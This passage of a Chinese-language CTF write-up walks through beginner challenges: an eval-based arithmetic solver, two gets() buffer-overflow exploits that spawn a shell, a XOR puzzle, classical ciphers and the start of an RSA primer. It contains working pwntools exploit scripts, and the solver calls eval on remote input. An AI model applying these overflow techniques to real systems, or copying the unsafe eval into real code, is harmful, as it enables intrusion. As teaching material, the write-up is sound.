+<li>語法 :  <div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(expression[, <span class="built_in">globals</span>[, <span class="built_in">locals</span>]])</span><br></pre></td></tr></table></figure></div></li>
+<li>例子 :   <div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">calculation = <span class="number">5</span>*<span class="number">10</span></span><br><span class="line">result = <span class="built_in">eval</span>(calculation)</span><br><span class="line"><span class="built_in">print</span>(result) <span class="comment">#會輸出50</span></span><br></pre></td></tr></table></figure></div>
+  <img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/B1dVHn36p.png" alt="image"></li>
+</ul>
+</li>
+<li><p>解題流程 </p>
+<ol>
+<li>先remote到目標主機</li>
+<li>利用迴圈，讀入運算式<br>  <img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/HyxPUnn6p.png" alt="image"><br>根據nc內容和eval的使用方法，得知我們要的是”79*10”或是”61+100”的部分，<br>也就是”: “後面跟”=”前面的部分，<br>所以這裡我的寫法是利用<code>recvuntil</code>把”: “前面都忽略掉，<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Question 1: 79*10= -&gt;79*10=</span><br></pre></td></tr></table></figure></div>
+之後再把後面的字串用變數儲存起來<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">calculation = r.recvuntil(<span class="string">b'='</span>).decode()</span><br></pre></td></tr></table></figure></div>
+.decode()是因為我們recv下來的字串會是byte形式，前面會多一個b’’<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">在Terminal上面看到的</span><br><span class="line">Question <span class="number">1</span>: <span class="number">79</span>*<span class="number">10</span>= </span><br><span class="line">如果全部recv下來，會是</span><br><span class="line"><span class="string">b'Question 1: 79*10='</span></span><br></pre></td></tr></table></figure></div>
+此時calculation = “79*10=”<br>但我們不要”=”，所以要多加一個[:-1]<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">calculation = r.recvuntil(<span class="string">b'='</span>)[:-<span class="number">1</span>].decode()</span><br></pre></td></tr></table></figure></div>
+解釋大概是[從0到 : 最後-1的位子]<br>這時候calculation就會是”79*10”了</li>
+<li>利用eval計算出答案送出</li>
+</ol>
+</li>
+</ul>
+<ol start="3">
+<li>程式碼如下 :<br>remote ip 記得更改為跟題目給的ip一樣<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">"192.168.3.17"</span>, <span class="number">20002</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b"try to answer it.\n"</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">101</span>):</span><br><span class="line">    r.recvuntil(<span class="string">b': '</span>)</span><br><span class="line">    calculation = r.recvuntil(<span class="string">b'='</span>)[:-<span class="number">1</span>].decode()</span><br><span class="line">    <span class="built_in">print</span>(calculation)</span><br><span class="line">    ans = <span class="built_in">eval</span>(calculation)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(ans))</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div></li>
+</ol>
+<h3 id="BabyOverFlow"><a href="#BabyOverFlow" class="headerlink" title="BabyOverFlow"></a>BabyOverFlow</h3><ol>
+<li><p>觀察babychal.c</p>
+<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">backdoor</span><span class="params">()</span> </span>{</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Oh No! You are a Bad Hacker!\n"</span>);</span><br><span class="line">    <span class="built_in">execve</span>(<span class="string">"/bin/sh"</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">uname</span><span class="params">()</span> </span>{</span><br><span class="line">    <span class="type">char</span> str[<span class="number">16</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"input your name: \n"</span>);</span><br><span class="line">    <span class="built_in">fgets</span>(str, <span class="built_in">sizeof</span>(str), stdin);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Hello, %s"</span>, str); </span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">uprofession</span><span class="params">()</span> </span>{</span><br><span class="line">    <span class="type">char</span> name[<span class="number">32</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"What is your profession? \n"</span>);</span><br><span class="line">    <span class="built_in">gets</span>(name);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Oh, I see. \n"</span>);</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>
+<p>發現可利用的副函式(backdoor)<br>裡面的<code>execve("/bin/sh", 0, 0);</code>可成功造成RCE<br>也發現在uprofession()裡面是使用<code>gets</code>讀輸入，代表可以輸入任意長度的字元<br>由以上可知這題是典型的Buffer overflow<br>所以可得解題流程 : </p>
+<ol>
+<li>先找出backdoor的記憶體位址</li>
+<li>利用gets，讓name的return address變成backdoor的記憶體位址，讓整個程式跳到backdoor</li>
+<li>最終執行execve(“/bin/sh”, 0, 0);成功RCE</li>
+</ol>
+</li>
+<li><p>gdb找backdoor記憶體位址<br>先載下題目給的babyflow並執行看看<br><code>記得chmod +x babyflow 不然執行不了</code><br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/Bk9dgVp6T.png" alt="image"><br>得知大概會長這樣<br>之後利用gdb找backdoor<br>輸入指令 <code>info functions</code><br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/SyhaZ4a6T.png" alt="image"><br>得到backdoor的記憶體位址為 <code>0x040121d</code></p>
+</li>
+<li><p>name + return adress的大小<br>從這裡可得知，name大小為32</p>
+<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">uprofession</span><span class="params">()</span> </span>{</span><br><span class="line">    <span class="type">char</span> name[<span class="number">32</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"What is your profession? \n"</span>);</span><br><span class="line">    <span class="built_in">gets</span>(name);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Oh, I see. \n"</span>);</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+<p>通常會在+8得到name + return adress的大小，所以我們最後payload會是<br>隨機長度為40的字串 + 0x040121d</p>
+</li>
+<li><p>程式碼如下<br>記得記憶體位址要用p64()包起來</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">"192.168.3.17"</span> ,<span class="number">20003</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b"input your name:"</span>, <span class="string">b"a"</span>)</span><br><span class="line">payload = <span class="string">b"a"</span>*<span class="number">40</span> + p64(<span class="number">0x040121d</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b"What is your profession?"</span>, payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div>
+<p><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/rkzmNEa6T.png" alt="image"></p>
+</li>
+</ol>
+<h3 id="How-old-are-you"><a href="#How-old-are-you" class="headerlink" title="How old are you?"></a>How old are you?</h3><p>這題只有給ELF檔(執行檔)所以先利用IDA去反編譯得到原始程式碼<br>IDA -&gt; 案F5反編譯</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">不過反編譯不一定完全正確，但基本應該都是對的</span><br></pre></td></tr></table></figure></div>
+<p><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/rJjtdRllR.png" alt="image"></p>
+<p>反編譯的結果:<br>一開始會先讀輸入(第五行利用scanf讀age)</p>
+<ul>
+<li>如果<br>age等於18，那就會return 0結束(第10行)</li>
+<li>否則<br>讀輸入(第15行利用gets讀name)<ul>
+<li>如果age等於18，那就會執行execve(“”/bin/sh”)(第20行取得RCE)</li>
+<li>否則<br>結束return 0(第28行)</li>
+</ul>
+</li>
+</ul>
+<p>由以上可知，我們要利用gets函數改到age的值(第15行)，讓age等於18成功RCE(第20行)<br>但是gets是讀name，那要怎麼改到age的值呢?<br>這時候可以去觀察看看變數的記憶體位址(在剛剛的IDA點兩下age)<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/rJ44jRgxA.png" alt="image"><br>從中獲取兩個訊息 : </p>
+<ul>
+<li>0x0404080是name的位址，0x0404090是age的位址</li>
+<li>name記憶體位址在age前面<br>經過計算，得知他們相差16bytes<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/BkwxaCgxA.png" alt="image"></li>
+</ul>
+<p>所以可以知道<br>name蓋16bytes會到age</p>
+<ul>
+<li>解法<br>利用gets蓋16bytes到age，讓age=18</li>
+</ul>
+<p>可以來寫exploit了</p>
+<ul>
+<li>程式碼如下 : <div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">"35.234.62.52"</span>, <span class="number">20003</span>)</span><br><span class="line"></span><br><span class="line">payload =  p64(<span class="number">18</span>)</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line">r.sendlineafter(<span class="string">b"How old are you?\n"</span>, <span class="string">b"17"</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b"What your name?\n"</span>, <span class="string">b"a"</span>*<span class="number">16</span>+p64(<span class="number">18</span>))</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div>
+<img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/BySuy1bl0.png" alt="image"></li>
+</ul>
+<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="BabyXOR"><a href="#BabyXOR" class="headerlink" title="BabyXOR"></a>BabyXOR</h3><p>這題考的是xor(也就是⊕(數學表示)、^(電腦表示))<br>要先知道甚麼是xor<br>可以參考這個網頁的介紹(知道大概原理跟特性就好)<br><a class="link" target="_blank" rel="noopener" href="https://ithelp.ithome.com.tw/articles/10318277">https://ithelp.ithome.com.tw/articles/10318277 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/Hympgy-l0.png" alt="image"><br>再來看這題的題目</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">key2 = <span class="string">"395467574f6d616c73774d6152733650374b496351367a64663438"</span> </span><br><span class="line">key1 ^ key3 = <span class="string">"7643346f3c5723212a061f1c272e0c6461036302313f6000393336"</span> </span><br><span class="line">key2 ^ key3 = <span class="string">"7c26306f175d131f381f2b0f34170f660018781221602c2005447d"</span></span><br><span class="line">Flag ^ key2 ^ key3 ^ key1 = <span class="string">"027b2050306e0436213e2022440e6507167d533e32282c0c0b3873"</span> </span><br><span class="line"></span><br><span class="line">Flag = ?</span><br></pre></td></tr></table></figure></div>
+<ul>
+<li><p>解法 :<br>結合特性中的<br>A⊕B⊕B = A⊕0 = A<br>把Flag ^ key2 ^ key3 ^ key1中的key2、key3、key1消掉得到flag<br>也就是(Flag ^ key2 ^ key3 ^ key1)^(key1 ^ key3)^(key2)<br>-&gt; 題目中的 第四行xor第二行xor第一行</p>
+</li>
+<li><p>程式碼如下 :<br><code>利用pwntools中的xor函數解題，注意該函數格式固定要是bytes，所以要先轉成bytes然後再去做xor 我這裡是先把key2跟(key1 ^ key3)xor起來，在一次跟(Flag ^ key2 ^ key3 ^ key1)消掉</code></p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">key2 = <span class="string">"395467574f6d616c73774d6152733650374b496351367a64663438"</span></span><br><span class="line">key1_3 = <span class="string">"7643346f3c5723212a061f1c272e0c6461036302313f6000393336"</span></span><br><span class="line">key2_3 = <span class="string">"7c26306f175d131f381f2b0f34170f660018781221602c2005447d"</span></span><br><span class="line">flag_2_3_1 = <span class="string">"027b2050306e0436213e2022440e6507167d533e32282c0c0b3873"</span></span><br><span class="line"></span><br><span class="line">key1_2_3 = xor(<span class="built_in">bytes</span>.fromhex(key2), <span class="built_in">bytes</span>.fromhex(key1_3))</span><br><span class="line"></span><br><span class="line">flag = xor(<span class="built_in">bytes</span>.fromhex(flag_2_3_1), key1_2_3)</span><br><span class="line"><span class="built_in">print</span>(flag.decode())</span><br></pre></td></tr></table></figure></div></li>
+</ul>
+<h3 id="Classical-Cipher"><a href="#Classical-Cipher" class="headerlink" title="Classical Cipher"></a>Classical Cipher</h3><p>從題目得知，這題考的是古典密碼<br>而常見的古典密碼有 : </p>
+<ul>
+<li>Caesar Cipher 凱薩密碼</li>
+<li>Vigenère Cipher 維吉尼亞密碼</li>
+<li>Rail-fence Cipher 籬笆密碼</li>
+<li>…還有很多</li>
+</ul>
+<p>根據以上猜測題目中的</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Fdp esp vpj "EspDloDezcj" ez cplo l dlo dezcj.</span><br></pre></td></tr></table></figure></div>
+<p>可能經過凱薩加密<br>所以利用線上解密器得到以下明文<br><a class="link" target="_blank" rel="noopener" href="https://cryptii.com/pipes/caesar-cipher">https://cryptii.com/pipes/caesar-cipher <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/Bk2WH1We0.png" alt="image"></p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Use the key "TheSadStory" to read a sad story.</span><br></pre></td></tr></table></figure></div>
+<p>讀字面意思就是用key讀story，而題目也有給story.txt，下載下來後打開看看</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Hugw usgg o kgfl, sf tkw gwxfm vj Foywfpvp 11mo. M oaocxr rjhui an </span><br><span class="line">wzx drpd, disrlfz o tmta efd iwxzzlz alw crdw kzlw ipgwlfz. W </span><br><span class="line">nymjlwd fgndccl wekslfz pp, gfhkanlfz avcmpry mb vxgkgglh gnh </span><br><span class="line">skcllw alw nhpm qfpglv. Tuw ag hyc xuh, slo A ycllw dek a saxqv my </span><br><span class="line">weheu xtzcggn fwfrjx ap crlw. Gn ll poj ukpxleq: </span><br><span class="line">"EEGYAMM{Lspsq_Lweeelw_Vab!}" Lxoiq plpdeg mi ieahuxjoodtpcw.</span><br></pre></td></tr></table></figure></div>
+<p>發現甚麼都看不懂，但因為這題題目叫Classical Cipher<br>而古典密碼中需要key的加密，常見的有維吉尼亞<br>故利用線上解密器，結合剛剛得出的key”TheSadStory”來解密看看<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/SkpSUJ-gC.png" alt="image"><br>成功得到FLAG</p>
+<hr>
+<p>講接下來的兩題RSA前，先補充一下，甚麼是RSA</p>
+<h3 id="RSA介紹"><a href="#RSA介紹" class="headerlink" title="RSA介紹"></a>RSA介紹</h3><p><a class="link" target="_blank" rel="noopener" href="https://zh.wikipedia.org/zh-tw/RSA%E5%8A%A0%E5%AF%86%E6%BC%94%E7%AE%97%E6%B3%95">https://zh.wikipedia.org/zh-tw/RSA%E5%8A%A0%E5%AF%86%E6%BC%94%E7%AE%97%E6%B3%95 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/ryHzFybl0.png" alt="image"></p>
+<ul>
+<li><p>模運算<br>  表示為a mod n<br>  a代表被取模的數，n是模數，運算結果為a除以n的餘數<br>  e.g. 18 mod 4 = 2 因為18除以4的餘數為2<br>  python表示<br>  a = 某數，e = 平方幾次，n = 模數</p>
+  <div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pow(a, e, n)</span><br></pre></td></tr></table></figure></div>
+<p>  e.g. 3的2次方mod4 = 1</p>
+  <div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pow(3, 2, 4)</span><br></pre></td></tr></table></figure></div></li>
+<li><p>RSA流程大致如下:</p>
+<ol>
+<li>先選擇任意兩大的質數(p和q)，且p不等於q</li>
+<li>設<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.439ex;" xmlns="http://www.w3.org/2000/svg" width="9.971ex" height="1.984ex" role="img" focusable="false" viewBox="0 -683 4407 877"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D441" d="M234 637Q231 637 226 637Q201 637 196 638T191 649Q191 676 202 682Q204 683 299 683Q376 683 387 683T401 677Q612 181 616 168L670 381Q723 592 723 606Q723 633 659 637Q635 637 635 648Q635 650 637 660Q641 676 643 679T653 683Q656 683 684 682T767 680Q817 680 843 681T873 682Q888 682 888 672Q888 650 880 642Q878 637 858 637Q787 633 769 597L620 7Q618 0 599 0Q585 0 582 2Q579 5 453 305L326 604L261 344Q196 88 196 79Q201 46 268 46H278Q284 41 284 38T282 19Q278 6 272 0H259Q228 2 151 2Q123 2 100 2T63 2T46 1Q31 1 31 10Q31 14 34 26T39 40Q41 46 62 46Q130 49 150 85Q154 91 221 362L289 634Q287 635 234 637Z"></path></g><g data-mml-node="mo" transform="translate(1165.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mi" transform="translate(2221.6,0)"><path data-c="1D45D" d="M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z"></path></g><g data-mml-node="mo" transform="translate(2946.8,0)"><path data-c="D7" d="M630 29Q630 9 609 9Q604 9 587 25T493 118L389 222L284 117Q178 13 175 11Q171 9 168 9Q160 9 154 15T147 29Q147 36 161 51T255 146L359 250L255 354Q174 435 161 449T147 471Q147 480 153 485T168 490Q173 490 175 489Q178 487 284 383L389 278L493 382Q570 459 587 475T609 491Q630 491 630 471Q630 464 620 453T522 355L418 250L522 145Q606 61 618 48T630 29Z"></path></g><g data-mml-node="mi" transform="translate(3947,0)"><path data-c="1D45E" d="M33 157Q33 258 109 349T280 441Q340 441 372 389Q373 390 377 395T388 406T404 418Q438 442 450 442Q454 442 457 439T460 434Q460 425 391 149Q320 -135 320 -139Q320 -147 365 -148H390Q396 -156 396 -157T393 -175Q389 -188 383 -194H370Q339 -192 262 -192Q234 -192 211 -192T174 -192T157 -193Q143 -193 143 -185Q143 -182 145 -170Q149 -154 152 -151T172 -148Q220 -148 230 -141Q238 -136 258 -53T279 32Q279 33 272 29Q224 -10 172 -10Q117 -10 75 30T33 157ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g></g></g></svg></mjx-container></li>
+<li>根據歐拉函數，得到<mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="40.238ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 17785 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D45F" d="M21 287Q22 290 23 295T28 317T38 348T53 381T73 411T99 433T132 442Q161 442 183 430T214 408T225 388Q227 382 228 382T236 389Q284 441 347 441H350Q398 441 422 400Q430 381 430 363Q430 333 417 315T391 292T366 288Q346 288 334 299T322 328Q322 376 378 392Q356 405 342 405Q286 405 239 331Q229 315 224 298T190 165Q156 25 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 114 189T154 366Q154 405 128 405Q107 405 92 377T68 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(728.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mi" transform="translate(1784.6,0)"><path data-c="1D711" d="M92 210Q92 176 106 149T142 108T185 85T220 72L235 70L237 71L250 112Q268 170 283 211T322 299T370 375T429 423T502 442Q547 442 582 410T618 302Q618 224 575 152T457 35T299 -10Q273 -10 273 -12L266 -48Q260 -83 252 -125T241 -179Q236 -203 215 -212Q204 -218 190 -218Q159 -215 159 -185Q159 -175 214 -2L209 0Q204 2 195 5T173 14T147 28T120 46T94 71T71 103T56 142T50 190Q50 238 76 311T149 431H162Q183 431 183 423Q183 417 175 409Q134 361 114 300T92 210ZM574 278Q574 320 550 344T486 369Q437 369 394 329T323 218Q309 184 295 109L286 64Q304 62 306 62Q423 62 498 131T574 278Z"></path></g><g data-mml-node="mo" transform="translate(2438.6,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(2827.6,0)"><path data-c="1D441" d="M234 637Q231 637 226 637Q201 637 196 638T191 649Q191 676 202 682Q204 683 299 683Q376 683 387 683T401 677Q612 181 616 168L670 381Q723 592 723 606Q723 633 659 637Q635 637 635 648Q635 650 637 660Q641 676 643 679T653 683Q656 683 684 682T767 680Q817 680 843 681T873 682Q888 682 888 672Q888 650 880 642Q878 637 858 637Q787 633 769 597L620 7Q618 0 599 0Q585 0 582 2Q579 5 453 305L326 604L261 344Q196 88 196 79Q201 46 268 46H278Q284 41 284 38T282 19Q278 6 272 0H259Q228 2 151 2Q123 2 100 2T63 2T46 1Q31 1 31 10Q31 14 34 26T39 40Q41 46 62 46Q130 49 150 85Q154 91 221 362L289 634Q287 635 234 637Z"></path></g><g data-mml-node="mo" transform="translate(3715.6,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(4382.3,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mi" transform="translate(5438.1,0)"><path data-c="1D711" d="M92 210Q92 176 106 149T142 108T185 85T220 72L235 70L237 71L250 112Q268 170 283 211T322 299T370 375T429 423T502 442Q547 442 582 410T618 302Q618 224 575 152T457 35T299 -10Q273 -10 273 -12L266 -48Q260 -83 252 -125T241 -179Q236 -203 215 -212Q204 -218 190 -218Q159 -215 159 -185Q159 -175 214 -2L209 0Q204 2 195 5T173 14T147 28T120 46T94 71T71 103T56 142T50 190Q50 238 76 311T149 431H162Q183 431 183 423Q183 417 175 409Q134 361 114 300T92 210ZM574 278Q574 320 550 344T486 369Q437 369 394 329T323 218Q309 184 295 109L286 64Q304 62 306 62Q423 62 498 131T574 278Z"></path></g><g data-mml-node="mo" transform="translate(6092.1,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(6481.1,0)"><path data-c="1D45D" d="M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z"></path></g><g data-mml-node="mo" transform="translate(6984.1,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(7595.3,0)"><path data-c="D7" d="M630 29Q630 9 609 9Q604 9 587 25T493 118L389 222L284 117Q178 13 175 11Q171 9 168 9Q160 9 154 15T147 29Q147 36 161 51T255 146L359 250L255 